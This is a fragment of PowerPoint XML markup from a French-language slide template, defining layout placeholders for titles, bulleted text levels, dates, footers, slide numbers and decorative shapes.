              <a:t>Troisième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Quatrième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Cinquième niveau</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Espace réservé du texte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Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Espace réservé du contenu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smtClean="0"/>
              <a:t>Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Deuxième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Troisième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Quatrième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Cinquième niveau</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Espace réservé de la date 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{99912834-3B72-454C-815D-54E05F95FD64}" type="datetimeFigureOut">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>6/13/2012</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Espace réservé du pied de page 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="6356350"/>
            <a:ext cx="2895600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Espace réservé du numéro de diapositive 8"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A7AE2596-86D4-4A71-9475-CB41442CF8CF}" type="slidenum">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="3952748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p>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Modifiez le style du titre</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Espace réservé de la date 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{99912834-3B72-454C-815D-54E05F95FD64}" type="datetimeFigureOut">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>6/13/2012</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé du pied de page 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="6356350"/>
            <a:ext cx="2895600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Espace réservé du numéro de diapositive 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A7AE2596-86D4-4A71-9475-CB41442CF8CF}" type="slidenum">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="4036422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a:xfrm>
            <a:off x="457200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{99912834-3B72-454C-815D-54E05F95FD64}" type="datetimeFigureOut">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>6/13/2012</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Espace réservé du pied de page 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="6356350"/>
            <a:ext cx="2895600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé du numéro de diapositive 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A7AE2596-86D4-4A71-9475-CB41442CF8CF}" type="slidenum">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="2048286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noProof="0" smtClean="0"/>
              <a:t>Modifiez le style du titre</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Espace réservé du contenu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smtClean="0"/>
              <a:t>Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Deuxième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Troisième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Quatrième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Cinquième niveau</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé du texte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smtClean="0"/>
              <a:t>Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Espace réservé de la date 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{99912834-3B72-454C-815D-54E05F95FD64}" type="datetimeFigureOut">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>6/13/2012</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Espace réservé du pied de page 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="6356350"/>
            <a:ext cx="2895600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Espace réservé du numéro de diapositive 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A7AE2596-86D4-4A71-9475-CB41442CF8CF}" type="slidenum">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="386935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noProof="0" smtClean="0"/>
              <a:t>Modifiez le style du titre</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Espace réservé pour une image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noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé du texte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smtClean="0"/>
              <a:t>Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Espace réservé de la date 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{99912834-3B72-454C-815D-54E05F95FD64}" type="datetimeFigureOut">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>6/13/2012</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Espace réservé du pied de page 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="6356350"/>
            <a:ext cx="2895600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Espace réservé du numéro de diapositive 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A7AE2596-86D4-4A71-9475-CB41442CF8CF}" type="slidenum">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="3593661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a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Modifiez le style du titre</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Espace réservé du texte vertical 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" orient="vert" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1600200"/>
            <a:ext cx="8229600" cy="4525963"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="eaVert"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Deuxième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Troisième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Quatrième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Cinquième niveau</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé de la date 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{99912834-3B72-454C-815D-54E05F95FD64}" type="datetimeFigureOut">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>6/13/2012</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Espace réservé du pied de page 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="6356350"/>
            <a:ext cx="2895600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Espace réservé du numéro de diapositive 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A7AE2596-86D4-4A71-9475-CB41442CF8CF}" type="slidenum">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="3075471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a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="eaVert"/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Modifiez le style du titre</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Espace réservé du texte vertical 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" orient="vert" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="274638"/>
            <a:ext cx="6019800" cy="5851525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="eaVert"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Modifiez les styles du texte du masque</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Deuxième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Troisième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Quatrième niveau</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Cinquième niveau</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Espace réservé de la date 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{99912834-3B72-454C-815D-54E05F95FD64}" type="datetimeFigureOut">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>6/13/2012</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Espace réservé du pied de page 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="6356350"/>
            <a:ext cx="2895600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Espace réservé du numéro de diapositive 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="6356350"/>
            <a:ext cx="2133600" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A7AE2596-86D4-4A71-9475-CB41442CF8CF}" type="slidenum">
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="149096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1A039D-8AC5-4649-B87E-11D026B4C786}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>6/13/2012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FC5426-DB44-4490-97D9-C6522809BC2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4365104"/>
            <a:ext cx="9144000" cy="2492896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F6F1DE"/>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solidFill>
                <a:srgbClr val="F1F0DB"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill flip="none" rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:gs>
              <a:gs pos="100000">
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:gs>
            </a:gsLst>
            <a:path path="circle">
              <a:fillToRect r="100000" b="100000"/>
            </a:path>
            <a:tileRect l="-100000" t="-100000"/>
          </a:gra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2" name="Titre 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="1484784"/>
            <a:ext cx="7772400" cy="720080"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>
